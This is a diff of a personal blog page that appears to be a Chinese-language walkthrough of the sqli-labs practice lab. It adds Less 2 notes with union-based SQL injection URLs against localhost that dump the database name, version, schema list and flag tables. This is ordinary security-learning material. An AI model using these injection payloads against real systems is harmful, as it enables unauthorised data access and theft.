@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="BoBo&#39;s Blog">
 <meta property="og:description" content="sqli-labs学习">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-28T10:34:31.891Z">
+<meta property="og:updated_time" content="2019-02-28T11:47:35.561Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
 <meta name="twitter:description" content="sqli-labs学习">
@@ -424,7 +424,12 @@
 <p>为了方便练习，自己加了个flag数据库还有fl4g的表，以后爆出fl4g数据即可</p>
 <p>爆flag数据库的表：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;--+</code></p>
 <p>爆fl4g这个表的列：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h2>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h2><p>第二关还是手动输入单引号测试，发现报错，单引号影响了闭合，所以这个可能不是字符型注入。</p>
+<p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,3--+</code>测试发现在2，3有回显，所以和第一关一样依次查询就好。</p>
+<p>爆当前数据库和版本：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,database(),version()--+</code></p>
+<p>查询所有数据库：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
+<p>查flag数据库的表：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;</code></p>
+
       
     </div>
     
